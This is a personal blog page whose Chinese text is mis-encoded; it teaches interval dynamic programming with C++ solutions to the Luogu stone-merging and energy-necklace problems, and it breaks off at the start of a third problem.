<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"ä¸‡ä¸€æ‰¾åˆ°äº†å‘¢","hits_empty":"ä½ è¯´çš„ ${query} æˆ‘æ€ä¹ˆæ‰¾ä¸ç€å‘¢ ","hits_stats":"æ‰¾åˆ°äº† ${hits} ä¸ªç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/4/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-%E5%8C%BA%E9%97%B4DP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-%E5%8C%BA%E9%97%B4DP/" class="post-title-link" itemprop="url">åŠ¨æ€è§„åˆ’-åŒºé—´DP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-23 21:30:00" itemprop="dateCreated datePublished" datetime="2022-12-23T21:30:00+08:00">2022-12-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-01-04 21:11:32" itemprop="dateModified" datetime="2023-01-04T21:11:32+08:00">2023-01-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="åŠ¨æ€è§„åˆ’-åŒºé—´dp">åŠ¨æ€è§„åˆ’-åŒºé—´DP</h1>
<p>æ¨¡æ¿é¢˜ä¸€èˆ¬é•¿è¿™æ ·:</p>
<p>ç»™ä¸€ä¸ªåŒºé—´[1,n]</p>
<p>ç»™å®šä¸€ç§æ“ä½œ:åˆå¹¶å­åŒºé—´,ä¸¤ä¸ªç›¸é‚»å­åŒºé—´[i,j],[j+1,k]åˆå¹¶,å¾—åˆ°ä¸€å®šçš„æ”¶ç›Šæˆ–è€…ä»˜å‡ºä¸€äº›ä»£ä»·.è¿™ä¸ªæ”¶ç›Šæˆ–è€…ä»£ä»·å¿…ç„¶æ˜¯å’Œä¸¤ä¸ªå­åŒºé—´ç›¸å…³çš„å‡½æ•°,æ¯”å¦‚sum[i,j]+sum[j+1,k]</p>
<p>æ±‚å°†æ•´ä¸ªåŒºé—´åˆå¹¶ä¸ºä¸€ä¸ªæ•°,è·å¾—çš„æœ€å¤§æ”¶ç›Šæˆ–è€…ä»˜å‡ºçš„æœ€å°ä»£ä»·</p>
<h2 id="p1880-åˆå¹¶ç¯çŠ¶çŸ³å­"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1880">P1880
åˆå¹¶ç¯çŠ¶çŸ³å­</a></h2>
<p>ä¸€åœˆçŸ³å­æœ‰nç»„,å…¶ä¸­ç¬¬iç»„æœ‰a[i]ä¸ª,åˆå¹¶ä¸¤ç»„çŸ³å­çš„ä»£ä»·æ˜¯ä¸¤ç»„çŸ³å­ä¸ªæ•°å’Œ,æ±‚å°†æ‰€æœ‰çŸ³å­åˆå¹¶æˆä¸€ç»„éœ€è¦çš„æœ€å¤§ä»£ä»·å’Œæœ€å°ä»£ä»·</p>
<blockquote>
<p>æœ¬é¢˜éœ€è¦å…ˆæŠŠç¯æ‹†æˆçº¿,å…¶å¼±åŒ–ç‰ˆä¹Ÿå°±æ˜¯æ— ç¯ç‰ˆæœ¬<a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1775">P1775
çŸ³å­åˆå¹¶ï¼ˆå¼±åŒ–ç‰ˆ</a></p>
</blockquote>
<p>é¦–å…ˆéœ€è¦æŠŠè¿™ä¸ªåœˆè§£å¼€,æ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯å°†[1,n]å±•å¼€æˆçº¿æ€§,ç„¶åå¤åˆ¶ä¸€éæ¥åˆ°åé¢,å°±æ˜¯</p>
<table style="width:100%;">
<colgroup>
<col style="width: 13%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 10%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 10%" />
<col style="width: 6%" />
</colgroup>
<thead>
<tr>
<th>æ€»ä¸‹æ ‡</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>...</th>
<th>n-1</th>
<th>n</th>
<th>n+1</th>
<th>n+2</th>
<th>n+3</th>
<th>...</th>
<th>2n-1</th>
<th>2n</th>
</tr>
</thead>
<tbody>
<tr>
<td>åŸä¸‹æ ‡</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>...</td>
<td>n-1</td>
<td>n</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>...</td>
<td>n-1</td>
<td>n</td>
</tr>
<tr>
<td>çŸ³å­ä¸ªæ•°</td>
<td>a[1]</td>
<td>a[2]</td>
<td>a[3]</td>
<td>..</td>
<td>a[n-1]</td>
<td>a[n]</td>
<td>a[1]</td>
<td>a[2]</td>
<td>a[3]</td>
<td>...</td>
<td>a[n-1]</td>
<td>a[n]</td>
</tr>
</tbody>
</table>
<h3 id="è®¾è®¡çŠ¶æ€">è®¾è®¡çŠ¶æ€</h3>
<p><span class="math display">\[
max\_dp[i][j]=å°†[i,j]åŒºé—´åˆå¹¶æˆä¸€ç»„çš„æœ€å¤§ä»£ä»·\\
min\_dp[i][j]=å°†[i,j]åŒºé—´åˆå¹¶ æˆä¸€ç»„çš„æœ€å°ä»£ä»·
\]</span></p>
<p>æ˜¾ç„¶è¾¹ç•Œæ¡ä»¶æ˜¯: <span class="math display">\[
\forall _{1\le i\le 2n}max\_dp[i][i]=0\\
\forall _{1\le i\le 2n}min\_dp[i][i]=0\\
\]</span>
æ„æ€æ˜¯å°†ä¸€ç»„çŸ³å­å’Œè‡ªå·±åˆå¹¶(åˆå¹¶ä¸ªå¯‚å¯),å…¶ä»£ä»·ä¸º0,å› ä¸ºä¸éœ€è¦åˆå¹¶</p>
<p><span class="math display">\[
max\_dp[i][j]=\max_{i\leq
k&lt;j}(max\_dp[i][k]+max\_dp[k+1][j])+\sum_{i\leq l\leq j}a[l]\\
min\_dp[i][j]=\max_{i\leq
k&lt;j}(min\_dp[i][k]+min\_dp[k+1][j])+\sum_{i\leq l\leq j}a[l]
\]</span></p>
<p>å…¶ä¸­<span class="math inline">\(\sum_{i\leq l\leq
j}a[l]\)</span>ä¹Ÿå°±æ˜¯ä»iåˆ°jçš„çŸ³å­æ€»ä¸ªæ•°,å¯ä»¥ç»´æŠ¤å‰ç¼€å’Œé™ä½å¤æ‚åº¦ <span
class="math display">\[
\sum_{i\leq l\leq j}a[l]=prefix[j]-prefix[i-1]
\]</span></p>
<h3 id="å®Œæ•´ä»£ç ">å®Œæ•´ä»£ç </h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">210</span>;</span><br><span class="line"><span class="type">int</span> value[maxn];</span><br><span class="line"><span class="type">int</span> max_dp[maxn][maxn];<span class="comment">//max_dp[i][j]ä¸ºåˆå¹¶é—­åŒºé—´[i,j]æ‰€éœ€è¦çš„æœ€å¤§ä»£ä»·</span></span><br><span class="line"><span class="type">int</span> min_dp[maxn][maxn];</span><br><span class="line"><span class="type">int</span> prefix[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    prefix[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;v;</span><br><span class="line">        value[i]=value[i+n]=v;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+value[i];</span><br><span class="line">        max_dp[i][i]=max_dp[i+n][i+n]=<span class="number">0</span>;<span class="comment">//åˆå§‹åŒ–è¾¹ç•Œæ¡ä»¶,åªæœ‰ä¸€å †æ—¶ä¸éœ€è¦åˆå¹¶,å› æ­¤æ— ä»£ä»·</span></span><br><span class="line">        min_dp[i][i]=min_dp[i+n][i+n]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>+n;i&lt;=n*<span class="number">2</span>;i++)&#123;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+value[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> delta=<span class="number">1</span>;delta&lt;n;delta++)&#123;<span class="comment">//delta,æ­¥é•¿,ç¡®å®šåŒºé—´å·¦ç«¯ç‚¹iä¹‹å,å³ç«¯ç‚¹j=i+delta,æ˜¾ç„¶deltaåˆå§‹å€¼åº”è¯¥æ˜¯1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="keyword">auto</span> temp_max=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">auto</span> temp_min=INF;<span class="comment">//ä¸´æ—¶å˜é‡,ç”¨äºè®¡ç®—æœ€å€¼</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                temp_max=<span class="built_in">max</span>(temp_max,max_dp[i][k]+max_dp[k<span class="number">+1</span>][j]+prefix[j]-prefix[i<span class="number">-1</span>]);<span class="comment">//çŠ¶æ€è½¬ç§»</span></span><br><span class="line">                temp_min=<span class="built_in">min</span>(temp_min,min_dp[i][k]+min_dp[k<span class="number">+1</span>][j]+prefix[j]-prefix[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            max_dp[i][j]=temp_max;</span><br><span class="line">            min_dp[i][j]=temp_min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max_value=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> min_value=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        max_value=<span class="built_in">max</span>(max_value,max_dp[i][i+n<span class="number">-1</span>]);</span><br><span class="line">        min_value=<span class="built_in">min</span>(min_value,min_dp[i][i+n<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;min_value&lt;&lt;endl&lt;&lt;max_value&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1063-åˆå¹¶èƒ½é‡ç å­"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1063">P1063
åˆå¹¶èƒ½é‡ç å­</a></h2>
<p>æ¯ä¸ªç å­æœ‰ä¸¤å¤´,è®°ä½œ(l,r),ç›¸é‚»ä¸¤ä¸ªç å­çš„ç›¸å‘ä¸¤å¤´æ•°å€¼ç›¸åŒ,æ¯”å¦‚ <span
class="math display">\[
(a,b)(b,c)(c,d)(d,a)
\]</span> åˆå¹¶ä¸¤ä¸ªç›¸é‚»ç å­<span
class="math inline">\((a,b)(b,c)\)</span>å¾—åˆ°çš„èƒ½é‡æ˜¯<span
class="math inline">\(a\times b\times c\)</span>,åˆå¹¶ä¹‹åå½¢æˆæ–°ç å­<span
class="math inline">\((a,c)\)</span></p>
<p>å°†æ•´ä¸ªé¡¹é“¾åˆå¹¶,æ±‚å¾—åˆ°çš„æœ€å¤§èƒ½é‡å€¼</p>
<p>è¿˜æ˜¯å°†æ•´ä¸ªç¯æ‹†æˆ[1,n]ç„¶åæ‹·è´ä¸€ä»½æ¥åˆ°åé¢</p>
<p><span
class="math inline">\(dp[i][j]\)</span>è¡¨ç¤ºåˆå¹¶åŒºé—´[i,j]èƒ½å¤Ÿå¾—åˆ°çš„æœ€å¤§èƒ½é‡,å…¶ä¸­iè¡¨ç¤ºç¬¬iä¸ªç å­,jè¡¨ç¤ºç¬¬jä¸ªç å­</p>
<p>è¾¹ç•Œæ¡ä»¶ä»ç„¶æ˜¯<span
class="math inline">\(dp[i][i]=0\)</span>,åªæœ‰ä¸€ä¸ªç å­ä¸éœ€è¦åˆå¹¶</p>
<p>çŠ¶æ€è½¬ç§»: <span class="math display">\[
dp[i][j]=\max_{i\le k&lt; j}(dp[i][k]+dp[k+1][j]+node[k].l\times
node[k].r\times node[k+1].r)
\]</span></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">210</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Bead</span>&#123;</span><br><span class="line">    <span class="type">int</span> __energy;<span class="comment">//åˆå¹¶æˆå½“å‰ç å­æ—¶èƒ½å¤Ÿè·å¾—çš„æœ€å¤§èƒ½é‡</span></span><br><span class="line">    <span class="type">int</span> __l;<span class="comment">//å·¦æ ‡è®°</span></span><br><span class="line">    <span class="type">int</span> __r;<span class="comment">//å³æ ‡è®°</span></span><br><span class="line">    <span class="built_in">Bead</span>(<span class="type">int</span> _l=<span class="number">0</span>,<span class="type">int</span> _r=<span class="number">0</span>,<span class="type">int</span> _e=<span class="number">0</span>):__l(_l),__r(_r),__energy(_e)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">l</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">r</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setL</span><span class="params">(<span class="type">int</span> _l)</span></span>&#123;</span><br><span class="line">        __l=_l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setR</span><span class="params">(<span class="type">int</span> _r)</span></span>&#123;</span><br><span class="line">        __r=_r;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setEnergy</span><span class="params">(<span class="type">int</span> _e)</span></span>&#123;</span><br><span class="line">        __energy=_e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">energy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __energy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+<span class="built_in">to_string</span>(__l)+<span class="string">&quot;,&quot;</span>+<span class="built_in">to_string</span>(__r)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> Bead &amp;bead)&#123;</span><br><span class="line">        os&lt;&lt;bead.<span class="built_in">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;bead[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dp[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;l;</span><br><span class="line">        bead[i][i].<span class="built_in">setL</span>(l);</span><br><span class="line">        bead[i+n][i+n].<span class="built_in">setL</span>(l);</span><br><span class="line">        bead[i+n<span class="number">-1</span>][i+n<span class="number">-1</span>].<span class="built_in">setR</span>(l);</span><br><span class="line">        bead[i<span class="number">-1</span>][i<span class="number">-1</span>].<span class="built_in">setR</span>(l);</span><br><span class="line">    &#125;</span><br><span class="line">    bead[<span class="number">2</span>*n][<span class="number">2</span>*n].<span class="built_in">setR</span>(bead[<span class="number">0</span>][<span class="number">0</span>].<span class="built_in">r</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> delta=<span class="number">1</span>;delta&lt;n;++delta)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=<span class="number">2</span>*n;++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="type">int</span> max_energy=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> temp_energy=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> max_k=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                </span><br><span class="line">                temp_energy=<span class="built_in">max</span>(max_energy,bead[i][k].<span class="built_in">energy</span>()+bead[k<span class="number">+1</span>][j].<span class="built_in">energy</span>()+bead[i][k].<span class="built_in">l</span>() * bead[i][k].<span class="built_in">r</span>() * bead[k<span class="number">+1</span>][j].<span class="built_in">r</span>());</span><br><span class="line">                <span class="keyword">if</span>(temp_energy&gt;max_energy)&#123;</span><br><span class="line">                    max_energy=temp_energy;</span><br><span class="line">                    max_k=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bead[i][j].<span class="built_in">setEnergy</span>(max_energy);</span><br><span class="line">            bead[i][j].<span class="built_in">setL</span>(bead[i][max_k].<span class="built_in">l</span>());</span><br><span class="line">            bead[i][j].<span class="built_in">setR</span>(bead[max_k<span class="number">+1</span>][j].<span class="built_in">r</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i+n<span class="number">-1</span>;</span><br><span class="line">        result=<span class="built_in">max</span>(result,bead[i][j].<span class="built_in">energy</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1005-çŸ©é˜µå–æ•°"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1005">P1005 çŸ©é˜µå–æ•°</a></h2>
<p>å¯¹äºä¸€ä¸ªç»™å®šçš„ <span class="math inline">\(n \times m\)</span>
çš„çŸ©é˜µï¼ŒçŸ©é˜µä¸­çš„æ¯ä¸ªå…ƒç´  <span class="math inline">\(a_{i,j}\)</span>
å‡ä¸ºéè´Ÿæ•´æ•°ã€‚æ¸¸æˆè§„åˆ™å¦‚ä¸‹ï¼š</p>
<ol type="1">
